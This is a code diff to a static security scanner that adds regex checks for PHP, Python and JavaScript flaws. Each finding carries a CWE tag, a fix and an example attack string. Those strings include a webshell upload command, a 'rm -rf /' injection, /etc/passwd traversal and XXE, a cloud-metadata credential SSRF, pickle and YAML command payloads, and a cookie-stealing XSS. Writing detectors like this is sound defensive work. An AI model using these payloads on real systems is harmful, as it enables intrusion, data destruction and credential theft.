-            path_match = re.search(r'(["\'][^"\']*(?:uploads|hackable|www|public_html|web)[^"\']*["\'])', code, re.IGNORECASE)
-            snippet = path_match.group(1) if path_match else '"<upload directory path>"'
-            issues.append({
-                "type": "Insecure File Upload - RCE Vulnerability",
+    # ── 4. Insecure file upload ────────────────────────────────────────────
+    if re.search(r'\$_FILES', clean):
+        has_move = re.search(r'move_uploaded_file', clean)
+        ext_only = re.search(r'strtolower\s*\(\s*\$\w*ext\w*\s*\)|pathinfo.*PATHINFO_EXTENSION', clean, re.IGNORECASE)
+        no_mime_check = not re.search(r'mime_content_type|finfo_file|getimagesize\s*\(', clean, re.IGNORECASE)
+        web_path = re.search(r'["\'][^"\']*(?:uploads?|www|public_html|htdocs|webroot)[^"\']*["\']', clean, re.IGNORECASE)
+        if has_move and (ext_only or no_mime_check) and web_path:
+            snippet = web_path.group(0)[:150]
+            _add({
+                "type": "Insecure File Upload — Remote Code Execution",
                 "severity": "Critical",
-                "description": (
-                    "Files are uploaded to a web-accessible directory with insufficient validation. "
-                    "An attacker could upload a malicious script and execute it remotely."
-                ),
+                "location": f"Line ~{code[:web_path.start()].count(chr(10)) + 1}",
                 "snippet": snippet,
+                "cwe": "CWE-434 — Unrestricted Upload of File with Dangerous Type",
+                "owasp": "A04:2021 — Insecure Design",
+                "attack_vector": "Attacker uploads a .php webshell; renames it to shell.php.jpg; server executes it.",
+                "poc": "curl -F 'file=@shell.php;type=image/jpeg' https://victim/upload.php",
+                "description": "Files uploaded to a web-accessible directory with insufficient content validation allow RCE.",
                 "fix": (
-                    "1. Move uploads outside the web root.\n"
-                    "2. Validate file content (not just extension) via binary/MIME inspection.\n"
-                    "3. Prevent code execution in upload directories via server config."
-                )
+                    "// 1. Store outside webroot: $dest = '/var/uploads/' . basename($filename);\n"
+                    "// 2. Validate MIME: $finfo = new finfo(FILEINFO_MIME_TYPE);\n"
+                    "//    if (!in_array($finfo->file($tmp), $allowed_types)) die('Invalid');\n"
+                    "// 3. Block execution in upload dir via .htaccess: php_flag engine off"
+                ),
             })
+
+    # ── 5. PHP Object Injection (unserialize) ─────────────────────────────
+    unser_pattern = r'unserialize\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE|SESSION)|unserialize\s*\(\s*base64_decode\s*\(\s*\$'
+    snippet, loc = _first_line(unser_pattern)
+    if snippet:
+        _add({
+            "type": "PHP Object Injection via unserialize()",
+            "severity": "Critical",
+            "location": loc,
+            "snippet": snippet,
+            "cwe": "CWE-502 — Deserialization of Untrusted Data",
+            "owasp": "A08:2021 — Software and Data Integrity Failures",
+            "attack_vector": "Attacker crafts a serialized payload exploiting __wakeup or __destruct magic methods.",
+            "poc": "O:8:'EvilClass':1:{s:4:'file';s:9:'/etc/passwd';}",
+            "description": "Deserializing untrusted data allows Object Injection, potentially leading to RCE.",
+            "fix": "Use json_decode()/json_encode() instead, or validate with a HMAC signature before deserializing.",
+        })
+
+    # ── 6. Variable injection (extract / parse_str) ───────────────────────
+    varinject_pattern = r'extract\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)|parse_str\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)'
+    snippet, loc = _first_line(varinject_pattern)
+    if snippet:
+        _add({
+            "type": "Variable Injection via extract() / parse_str()",
+            "severity": "High",
+            "location": loc,
+            "snippet": snippet,
+            "cwe": "CWE-473 — PHP External Variable Modification",
+            "owasp": "A03:2021 — Injection",
+            "attack_vector": "Attacker passes ?is_admin=1 to overwrite any variable in scope.",
+            "poc": "GET /page.php?is_admin=1&price=0",
+            "description": "extract() and parse_str() import all keys as PHP variables, allowing any variable to be overwritten.",
+            "fix": "Remove extract()/parse_str(). Access $_POST['key'] explicitly with validation.",
+        })
+
+    # ── 7. Weak randomness for security tokens ────────────────────────────
+    weakrand_pattern = r'(?:rand|mt_rand|array_rand|shuffle)\s*\(.*?\)\s*(?:;|\.)'
+    if re.search(weakrand_pattern, clean):
+        token_context = re.search(
+            r'(?:token|nonce|salt|secret|otp|code|csrf|session|key|password|pwd|hash)\s*=\s*.*?(?:rand|mt_rand)',
+            clean, re.IGNORECASE
+        )
+        if token_context:
+            snippet = token_context.group(0)[:150].strip()
+            _add({
+                "type": "Insecure Randomness for Security Token",
+                "severity": "High",
+                "location": f"Line ~{code[:token_context.start()].count(chr(10)) + 1}",
+                "snippet": snippet,
+                "cwe": "CWE-338 — Use of Cryptographically Weak PRNG",
+                "owasp": "A02:2021 — Cryptographic Failures",
+                "attack_vector": "Attacker can predict token values due to seeded, non-cryptographic PRNG.",
+                "poc": "// Brute-force token in O(2^32) — feasible offline in minutes",
+                "description": "rand()/mt_rand() are not cryptographically secure and must not be used for security-sensitive tokens.",
+                "fix": "$token = bin2hex(random_bytes(32)); // PHP 7+",
+            })
+
+    # ── 8. Open redirect ──────────────────────────────────────────────────
+    redirect_pattern = r'header\s*\(\s*["\']Location:\s*["\'\s]*\.\s*\$|\header\s*\(\s*"Location:\s*\$|\header\s*\(.*?\$_(?:GET|POST|REQUEST)'
+    snippet, loc = _first_line(redirect_pattern)
+    if snippet:
+        _add({
+            "type": "Open Redirect",
+            "severity": "Medium",
+            "location": loc,
+            "snippet": snippet,
+            "cwe": "CWE-601 — URL Redirection to Untrusted Site",
+            "owasp": "A01:2021 — Broken Access Control",
+            "attack_vector": "Attacker sends victim a trusted-looking URL that redirects to phishing site.",
+            "poc": "https://victim.com/redirect.php?url=https://evil.com",
+            "description": "Unvalidated user-controlled URL in header() Location redirect enables phishing attacks.",
+            "fix": (
+                "$allowed = ['https://trusted.com', 'https://app.local'];\n"
+                "if (!in_array($url, $allowed)) die('Invalid redirect');\n"
+                "header('Location: ' . $url);"
+            ),
+        })
+
+    # ── 9. Path traversal ─────────────────────────────────────────────────
+    lfi_pattern = r'(?:include|require|include_once|require_once|readfile|file_get_contents|fopen|file)\s*\(\s*(?:\$_(?:GET|POST|REQUEST|COOKIE)|[^)]*\.\s*\$_(?:GET|POST|REQUEST|COOKIE))'
+    snippet, loc = _first_line(lfi_pattern)
+    if snippet:
+        _add({
+            "type": "Path Traversal / Local File Inclusion",
+            "severity": "Critical",
+            "location": loc,
+            "snippet": snippet,
+            "cwe": "CWE-22 — Path Traversal",
+            "owasp": "A01:2021 — Broken Access Control",
+            "attack_vector": "GET ?file=../../../../etc/passwd or ?page=http://evil.com/shell.txt",
+            "poc": "?file=../../../../../../etc/passwd%00",
+            "description": "User-controlled path passed directly to file functions allows reading arbitrary files or RCE via RFI.",
+            "fix": (
+                "$allowed_pages = ['home', 'about', 'contact'];\n"
+                "$page = basename($_GET['page']);\n"
+                "if (!in_array($page, $allowed_pages)) die('Invalid');\n"
+                "include 'pages/' . $page . '.php';"
+            ),
+        })
+
+    # ── 10. SSRF via curl / file_get_contents with user URL ───────────────
+    ssrf_pattern = r'(?:curl_setopt.*CURLOPT_URL.*\$_(?:GET|POST|REQUEST)|file_get_contents\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE))'
+    snippet, loc = _first_line(ssrf_pattern)
+    if snippet:
+        _add({
+            "type": "Server-Side Request Forgery (SSRF)",
+            "severity": "High",
+            "location": loc,
+            "snippet": snippet,
+            "cwe": "CWE-918 — Server-Side Request Forgery",
+            "owasp": "A10:2021 — Server-Side Request Forgery",
+            "attack_vector": "Attacker makes server fetch http://169.254.169.254/latest/meta-data/ (cloud metadata).",
+            "poc": "?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "description": "User-controlled URL fetched server-side can reach internal services, cloud metadata, or localhost.",
+            "fix": (
+                "$parsed = parse_url($url);\n"
+                "$allowed_hosts = ['api.trusted.com'];\n"
+                "if (!in_array($parsed['host'], $allowed_hosts)) die('Blocked');"
+            ),
+        })
+
+    # ── 11. XXE — XML parsers with external entities enabled ──────────────
+    xxe_pattern = r'(?:simplexml_load_string|simplexml_load_file|DOMDocument\s*\(\)|new\s+SimpleXMLElement|XMLReader\s*::)\s*(?:\(|->)'
+    if re.search(xxe_pattern, clean, re.IGNORECASE):
+        no_protection = not re.search(r'LIBXML_NOENT|LIBXML_DTDLOAD|libxml_disable_entity_loader', clean, re.IGNORECASE)
+        if no_protection:
+            snippet, loc = _first_line(xxe_pattern)
+            _add({
+                "type": "XML External Entity Injection (XXE)",
+                "severity": "High",
+                "location": loc,
+                "snippet": snippet,
+                "cwe": "CWE-611 — Improper Restriction of XML External Entity Reference",
+                "owasp": "A05:2021 — Security Misconfiguration",
+                "attack_vector": "Attacker posts XML with <!ENTITY xxe SYSTEM 'file:///etc/passwd'> to read files.",
+                "poc": "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><r>&xxe;</r>",
+                "description": "XML parser loads external entities by default, enabling file read and SSRF.",
+                "fix": (
+                    "libxml_disable_entity_loader(true); // PHP < 8.0\n"
+                    "// PHP 8+: external entity loading is disabled by default\n"
+                    "$dom = new DOMDocument();\n"
+                    "$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);"
+                ),
+            })
+
+    # ── 12. Session fixation ──────────────────────────────────────────────
+    sessfix_pattern = r'session_id\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)'
+    snippet, loc = _first_line(sessfix_pattern)
+    if snippet:
+        _add({
+            "type": "Session Fixation",
+            "severity": "High",
+            "location": loc,
+            "snippet": snippet,
+            "cwe": "CWE-384 — Session Fixation",
+            "owasp": "A07:2021 — Identification and Authentication Failures",
+            "attack_vector": "Attacker sets ?PHPSESSID=attacker_known_id; victim logs in; attacker takes over session.",
+            "poc": "https://victim.com/login?PHPSESSID=abc123 → victim logs in → attacker uses PHPSESSID=abc123",
+            "description": "Accepting session ID from user input allows attacker to pre-set a known session ID.",
+            "fix": "// After login, always regenerate the session ID:\nsession_regenerate_id(true);",
+        })
+
+    # ── 13. assert() with user input (RCE) ────────────────────────────────
+    assert_pattern = r'assert\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)'
+    snippet, loc = _first_line(assert_pattern)
+    if snippet:
+        _add({
+            "type": "Remote Code Execution via assert()",
+            "severity": "Critical",
+            "location": loc,
+            "snippet": snippet,
+            "cwe": "CWE-94 — Code Injection",
+            "owasp": "A03:2021 — Injection",
+            "attack_vector": "assert() with a string argument evaluates it as PHP code.",
+            "poc": "?expr=system('id')",
+            "description": "assert() with a string argument is equivalent to eval() — direct RCE.",
+            "fix": "// Remove assert() with user input entirely. Use explicit boolean checks.",
+        })
+
+    # ── 14. eval() / preg_replace /e modifier ────────────────────────────
+    eval_pattern = r'eval\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)|preg_replace\s*\(\s*["\'][^"\']*\/e[^"\']*["\']'
+    snippet, loc = _first_line(eval_pattern)
+    if snippet:
+        _add({
+            "type": "Remote Code Execution via eval()",
+            "severity": "Critical",
+            "location": loc,
+            "snippet": snippet,
+            "cwe": "CWE-94 — Code Injection",
+            "owasp": "A03:2021 — Injection",
+            "attack_vector": "eval() executes arbitrary PHP code supplied by the attacker.",
+            "poc": "?code=system('whoami');",
+            "description": "eval() with user-controlled input is direct Remote Code Execution.",
+            "fix": "// Never pass user input to eval(). Refactor to use a safe dispatch table.",
+        })
 
     if not issues:
         return None
 
-    # Only report issues that the AI missed (it said the code was secure)
-    if "[Secure]" not in analysis_results and "No Vulnerabilities Detected" not in analysis_results:
-        return None
-
-    result = "## [Critical] Security Issues Detected by Secondary Verification\n\n"
+    result = "## Security Issues Detected by Deterministic Analysis\n\n"
+    result += f"> {len(issues)} issue(s) found by pattern-based checks (always reported regardless of AI verdict)\n\n"
     for i, issue in enumerate(issues, 1):
-        result += f"## [{issue['severity']}] Issue #{i}: {issue['type']}\n\n"
-        result += f"**Description:** {issue['description']}\n\n"
-        result += f"**Code Snippet:**\n```php\n{issue['snippet']}\n```\n\n"
-        result += f"**Impact:** {issue['description']}\n\n"
-        result += f"**Fix:** {issue['fix']}\n\n"
+        result += _fmt_issue(i, issue, "php")
+    return result
 
+
+def verify_python_security(code: str) -> str:
+    """Deterministic Python security checks. Returns formatted findings or None."""
+    clean = _strip_code_comments(code, "python")
+    issues = []
+    seen_types: set = set()
+
+    def _first(pattern: str) -> tuple[str, str]:
+        m = re.search(pattern, clean, re.IGNORECASE | re.DOTALL)
+        if not m:
+            return "", ""
+        snippet = m.group(0)[:200].strip()
+        loc = f"Line ~{code[:code.find(m.group(0))].count(chr(10)) + 1}" if m.group(0) in code else "See snippet"
+        return snippet, loc
+
+    def _add(issue: dict):
+        if issue["type"] not in seen_types:
+            seen_types.add(issue["type"])
+            issues.append(issue)
+
+    # eval / exec with user input
+    snippet, loc = _first(r'(?:eval|exec)\s*\([^)]*(?:input\s*\(|request\.|flask\.request|argv|environ|sys\.stdin)')
+    if snippet:
+        _add({"type": "RCE via eval()/exec()", "severity": "Critical", "location": loc, "snippet": snippet,
+              "cwe": "CWE-94 — Code Injection", "owasp": "A03:2021 — Injection",
+              "attack_vector": "User input passed directly to eval/exec executes arbitrary Python code.",
+              "poc": "input: __import__('os').system('id')",
+              "description": "eval()/exec() with user-controlled input allows full Remote Code Execution.",
+              "fix": "# Never eval() user input. Use ast.literal_eval() for safe literal parsing."})
+
+    # pickle / marshal / shelve
+    snippet, loc = _first(r'pickle\.loads?\s*\(|marshal\.loads?\s*\(|shelve\.open\s*\(')
+    if snippet:
+        _add({"type": "Unsafe Deserialization (pickle/marshal)", "severity": "Critical", "location": loc, "snippet": snippet,
+              "cwe": "CWE-502 — Deserialization of Untrusted Data", "owasp": "A08:2021 — Integrity Failures",
+              "attack_vector": "Attacker sends crafted pickle payload; Python executes __reduce__ during deserialization.",
+              "poc": "import pickle,os; pickle.loads(b'cos\\nsystem\\n(S\\'id\\'\\ntR.')",
+              "description": "Deserializing untrusted pickle/marshal data leads to RCE via __reduce__ gadgets.",
+              "fix": "# Use json.loads() or a schema-validated format. Never pickle untrusted data."})
+
+    # yaml.load without SafeLoader
+    snippet, loc = _first(r'yaml\.load\s*\([^)]*\)(?!\s*,\s*Loader\s*=\s*yaml\.SafeLoader)')
+    if snippet:
+        _add({"type": "YAML Deserialization RCE", "severity": "Critical", "location": loc, "snippet": snippet,
+              "cwe": "CWE-502 — Deserialization of Untrusted Data", "owasp": "A08:2021 — Integrity Failures",
+              "attack_vector": "YAML document with !!python/object/apply: os.system ['id'] executes OS commands.",
+              "poc": "!!python/object/apply:os.system ['whoami']",
+              "description": "yaml.load() without Loader=yaml.SafeLoader executes arbitrary Python via special YAML tags.",
+              "fix": "yaml.safe_load(data)  # or yaml.load(data, Loader=yaml.SafeLoader)"})
+
+    # subprocess with shell=True and user input
+    snippet, loc = _first(r'subprocess\.(?:call|run|Popen|check_output)\s*\([^)]*shell\s*=\s*True')
+    if snippet:
+        _add({"type": "OS Command Injection via subprocess(shell=True)", "severity": "Critical", "location": loc, "snippet": snippet,
+              "cwe": "CWE-78 — OS Command Injection", "owasp": "A03:2021 — Injection",
+              "attack_vector": "Shell metacharacters in user input execute arbitrary OS commands.",
+              "poc": "filename = 'file.txt; rm -rf /'",
+              "description": "shell=True passes the command to the OS shell — any unescaped user input enables command injection.",
+              "fix": "subprocess.run(['cmd', arg1, arg2], shell=False)  # Pass args as list"})
+
+    # SQL injection via string formatting
+    snippet, loc = _first(r'(?:execute|executemany)\s*\(\s*["\'][^"\']*%s[^"\']*["\'\s]*%\s*\(|\bexecute\b.*\.format\s*\(|f["\'][^"\']*SELECT[^"\']*\{')
+    if snippet:
+        _add({"type": "SQL Injection via String Formatting", "severity": "Critical", "location": loc, "snippet": snippet,
+              "cwe": "CWE-89 — SQL Injection", "owasp": "A03:2021 — Injection",
+              "attack_vector": "Attacker injects SQL via string-formatted query parameter.",
+              "poc": "' OR '1'='1",
+              "description": "SQL query built with % or .format() instead of parameterised placeholders allows injection.",
+              "fix": "cursor.execute('SELECT * FROM users WHERE id = ?', (user_id,))"})
+
+    # Weak randomness for tokens
+    snippet, loc = _first(r'random\.(?:random|randint|choice|randrange)\s*\(')
+    if snippet:
+        token_ctx = re.search(r'(?:token|secret|key|nonce|csrf|salt|otp|session|password)[^=\n]*=.*?random\.', clean, re.IGNORECASE)
+        if token_ctx:
+            snippet = token_ctx.group(0)[:150].strip()
+            _add({"type": "Insecure Randomness for Security Token", "severity": "High", "location": loc, "snippet": snippet,
+                  "cwe": "CWE-338 — Cryptographically Weak PRNG", "owasp": "A02:2021 — Cryptographic Failures",
+                  "attack_vector": "Python's random module is seeded and predictable; tokens can be brute-forced.",
+                  "poc": "# Predict next value by observing previous outputs",
+                  "description": "random module is not cryptographically secure. Use secrets module for security tokens.",
+                  "fix": "import secrets; token = secrets.token_urlsafe(32)"})
+
+    # SSRF via requests with user input
+    snippet, loc = _first(r'requests\.(?:get|post|put|delete|head|request)\s*\([^)]*(?:request\.|flask\.request|argv|input\s*\(|environ)')
+    if snippet:
+        _add({"type": "Server-Side Request Forgery (SSRF)", "severity": "High", "location": loc, "snippet": snippet,
+              "cwe": "CWE-918 — SSRF", "owasp": "A10:2021 — SSRF",
+              "attack_vector": "Attacker passes http://169.254.169.254/ to fetch cloud metadata or internal services.",
+              "poc": "?url=http://169.254.169.254/latest/meta-data/",
+              "description": "User-controlled URL passed to requests library enables SSRF to internal/cloud resources.",
+              "fix": "# Validate URL against an allowlist before fetching\nif urlparse(url).hostname not in ALLOWED_HOSTS: raise ValueError"})
+
+    # MD5/SHA1 for passwords
+    snippet, loc = _first(r'hashlib\.(?:md5|sha1)\s*\([^)]*(?:password|passwd|pwd|secret)')
+    if snippet:
+        _add({"type": "Insecure Password Hashing (MD5/SHA1)", "severity": "Critical", "location": loc, "snippet": snippet,
+              "cwe": "CWE-916 — Weak Password Hash", "owasp": "A02:2021 — Cryptographic Failures",
+              "attack_vector": "Attacker dumps database and cracks MD5/SHA1 hashes offline in seconds.",
+              "poc": "hashcat -a 0 -m 0 hashes.txt rockyou.txt",
+              "description": "MD5/SHA1 are fast hashes, unsuitable for passwords. Crackable in seconds with GPU.",
+              "fix": "import bcrypt; bcrypt.hashpw(password.encode(), bcrypt.gensalt())"})
+
+    # tempfile.mktemp (TOCTOU)
+    snippet, loc = _first(r'tempfile\.mktemp\s*\(')
+    if snippet:
+        _add({"type": "Race Condition (TOCTOU) via tempfile.mktemp()", "severity": "Medium", "location": loc, "snippet": snippet,
+              "cwe": "CWE-377 — Insecure Temporary File", "owasp": "A04:2021 — Insecure Design",
+              "attack_vector": "Attacker creates a symlink between mktemp() returning a name and the file being created.",
+              "poc": "# Race: ln -s /etc/passwd /tmp/tmpXXXXXX between mktemp() and open()",
+              "description": "mktemp() returns a name without creating the file — race condition between name generation and use.",
+              "fix": "fd, path = tempfile.mkstemp()  # Atomically creates and opens the file"})
+
+    if not issues:
+        return None
+    result = "## Security Issues Detected by Deterministic Python Analysis\n\n"
+    result += f"> {len(issues)} issue(s) found by pattern-based checks\n\n"
+    for i, issue in enumerate(issues, 1):
+        result += _fmt_issue(i, issue, "python")
+    return result
+
+
+def verify_javascript_security(code: str) -> str:
+    """Deterministic JavaScript / Node.js security checks. Returns formatted findings or None."""
+    clean = _strip_code_comments(code, "javascript")
+    issues = []
+    seen_types: set = set()
+
+    def _first(pattern: str) -> tuple[str, str]:
+        m = re.search(pattern, clean, re.IGNORECASE | re.DOTALL)
+        if not m:
+            return "", ""
+        snippet = m.group(0)[:200].strip()
+        loc = f"Line ~{code[:code.find(m.group(0))].count(chr(10)) + 1}" if m.group(0) in code else "See snippet"
+        return snippet, loc
+
+    def _add(issue: dict):
+        if issue["type"] not in seen_types:
+            seen_types.add(issue["type"])
+            issues.append(issue)
+
+    # eval / Function constructor
+    snippet, loc = _first(r'\beval\s*\(|new\s+Function\s*\(')
+    if snippet:
+        _add({"type": "Code Injection via eval()/Function()", "severity": "Critical", "location": loc, "snippet": snippet,
+              "cwe": "CWE-94 — Code Injection", "owasp": "A03:2021 — Injection",
+              "attack_vector": "User-controlled string passed to eval() executes arbitrary JavaScript.",
+              "poc": "eval(location.hash.slice(1))  →  #alert(document.cookie)",
+              "description": "eval() and new Function() execute arbitrary JavaScript — XSS or RCE in Node.js.",
+              "fix": "// Remove eval(). Use JSON.parse() for data, or a safe template renderer."})
+
+    # innerHTML / outerHTML / insertAdjacentHTML
+    xss_sink = re.finditer(r'(?:\.innerHTML|\.outerHTML|\.insertAdjacentHTML\s*\(|document\.write\s*\(|\.html\s*\()\s*[=\(]?\s*(?:[^;]*(?:location|search|hash|param|query|input|value|data|user|req\.))', clean, re.IGNORECASE)
+    xss_matches = list(xss_sink)
+    if xss_matches:
+        snippet = xss_matches[0].group(0)[:200].strip()
+        _add({"type": "DOM-based XSS via innerHTML/outerHTML", "severity": "High", "location": "See snippet", "snippet": snippet,
+              "cwe": "CWE-79 — Cross-Site Scripting", "owasp": "A03:2021 — Injection",
+              "attack_vector": "User-controlled data (URL params, form values) written to DOM sinks without sanitization.",
+              "poc": "#<img src=x onerror=alert(document.cookie)>",
+              "description": "Writing unsanitized user data to innerHTML/outerHTML allows DOM XSS attacks.",
+              "fix": "element.textContent = userInput;  // Use textContent, not innerHTML\n// Or: DOMPurify.sanitize(userInput)"})
+
+    # child_process with user input (Node.js)
+    snippet, loc = _first(r'(?:exec|execSync|spawn|spawnSync)\s*\([^)]*(?:req\.|request\.|process\.argv|process\.env)')
+    if snippet:
+        _add({"type": "OS Command Injection (Node.js child_process)", "severity": "Critical", "location": loc, "snippet": snippet,
+              "cwe": "CWE-78 — OS Command Injection", "owasp": "A03:2021 — Injection",
+              "attack_vector": "User-controlled string injected into shell command via exec/spawn.",
+              "poc": "?file=test.txt;rm -rf /",
+              "description": "child_process.exec() with unsanitized user input allows arbitrary OS command execution.",
+              "fix": "// Use spawn() with args array (no shell interpolation):\nspawn('cmd', [safeArg], { shell: false })"})
+
+    # Math.random for security
+    snippet, loc = _first(r'Math\.random\s*\(\s*\)')
+    if snippet:
+        token_ctx = re.search(r'(?:token|secret|key|nonce|csrf|salt|otp|session|password)[^=\n]*=.*?Math\.random', clean, re.IGNORECASE)
+        if token_ctx:
+            snippet = token_ctx.group(0)[:150].strip()
+            _add({"type": "Insecure Randomness for Security Token", "severity": "High", "location": loc, "snippet": snippet,
+                  "cwe": "CWE-338 — Weak PRNG", "owasp": "A02:2021 — Cryptographic Failures",
+                  "attack_vector": "Math.random() is not cryptographically secure and can be predicted.",
+                  "poc": "# Predict seed from observed values",
+                  "description": "Math.random() must not be used for security tokens. Predictable in browser environments.",
+                  "fix": "const token = crypto.randomBytes(32).toString('hex');  // Node.js\n// Browser: crypto.getRandomValues(new Uint8Array(32))"})
+
+    # postMessage without origin check
+    if re.search(r'addEventListener\s*\(\s*["\']message["\']', clean):
+        no_origin_check = not re.search(r'event\.origin|message\.origin', clean)
+        if no_origin_check:
+            snippet, loc = _first(r'addEventListener\s*\(\s*["\']message["\']')
+            _add({"type": "Missing postMessage Origin Validation", "severity": "Medium", "location": loc, "snippet": snippet,
+                  "cwe": "CWE-346 — Origin Validation Error", "owasp": "A01:2021 — Broken Access Control",
+                  "attack_vector": "Attacker's page sends postMessage to victim; handler executes without origin check.",
+                  "poc": "// From attacker: targetWindow.postMessage('malicious', '*')",
+                  "description": "message event handler does not validate event.origin, accepting messages from any window.",
+                  "fix": "window.addEventListener('message', (e) => {\n  if (e.origin !== 'https://trusted.com') return;\n  // handle\n});"})
+
+    # Open redirect (Node/Express)
+    snippet, loc = _first(r'res\.redirect\s*\([^)]*(?:req\.(?:query|body|params)|request\.)')
+    if snippet:
+        _add({"type": "Open Redirect", "severity": "Medium", "location": loc, "snippet": snippet,
+              "cwe": "CWE-601 — Open Redirect", "owasp": "A01:2021 — Broken Access Control",
+              "attack_vector": "Attacker sends victim a URL that redirects to a phishing page.",
+              "poc": "/redirect?url=https://evil.com",
+              "description": "Unvalidated user-controlled URL in redirect enables phishing and credential theft.",
+              "fix": "const ALLOWED = new Set(['/', '/dashboard', '/profile']);\nif (!ALLOWED.has(url)) url = '/';\nres.redirect(url);"})
+
+    # Prototype pollution
+    snippet, loc = _first(r'(?:merge|extend|assign|defaults)\s*\([^)]*(?:req\.|request\.|body\.|query\.)')
+    if snippet:
+        _add({"type": "Prototype Pollution via Object Merge", "severity": "High", "location": loc, "snippet": snippet,
+              "cwe": "CWE-1321 — Prototype Pollution", "owasp": "A08:2021 — Integrity Failures",
+              "attack_vector": '{"__proto__": {"isAdmin": true}} merged into app object pollutes Object.prototype.',
+              "poc": 'POST body: {"__proto__": {"admin": true}}',
+              "description": "Merging user-controlled objects without key sanitization can pollute Object.prototype.",
+              "fix": "// Sanitize keys before merge:\nconst safe = JSON.parse(JSON.stringify(userObj));\n// Or use Object.create(null) as base"})
+
+    if not issues:
+        return None
+    result = "## Security Issues Detected by Deterministic JavaScript Analysis\n\n"
+    result += f"> {len(issues)} issue(s) found by pattern-based checks\n\n"
+    for i, issue in enumerate(issues, 1):
+        result += _fmt_issue(i, issue, "javascript")
     return result
 
 
